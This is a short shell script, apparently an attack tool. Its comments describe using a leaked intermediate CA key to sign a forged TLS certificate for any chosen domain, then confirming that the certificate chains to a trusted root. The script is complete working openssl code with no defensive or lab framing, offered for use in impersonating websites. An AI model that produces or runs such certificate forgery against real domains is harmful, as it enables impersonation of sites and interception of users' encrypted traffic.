#!/bin/sh
# Sign a forged leaf certificate with the leaked intermediate CA key and verify the chain
# Usage: forge_cert.sh <ca_cert.pem> <ca_key.pem> <root_cert.pem> <domain> <leaf_out.pem>
set -e

ca_cert="$1"
ca_key="$2"
root_cert="$3"
domain="$4"
leaf_out="$5"

tmpdir=$(mktemp -d)
trap 'rm -rf "$tmpdir"' EXIT

# Generate the leaf key + CSR (with SAN)
openssl ecparam -name secp384r1 -genkey -noout -out "$tmpdir/leaf.key"
openssl req -new -key "$tmpdir/leaf.key" -out "$tmpdir/leaf.csr" \
  -subj "/CN=$domain" -addext "subjectAltName=DNS:$domain"

# Sign the leaf with the intermediate CA
cat > "$tmpdir/ext" <<EOF
subjectAltName=DNS:$domain
EOF
openssl x509 -req -in "$tmpdir/leaf.csr" -CA "$ca_cert" -CAkey "$ca_key" \
  -CAcreateserial -days 365 -out "$leaf_out" -extfile "$tmpdir/ext"

echo "== forged: $leaf_out =="
echo "== verify chain =="
openssl verify -CAfile "$root_cert" -untrusted "$ca_cert" "$leaf_out"
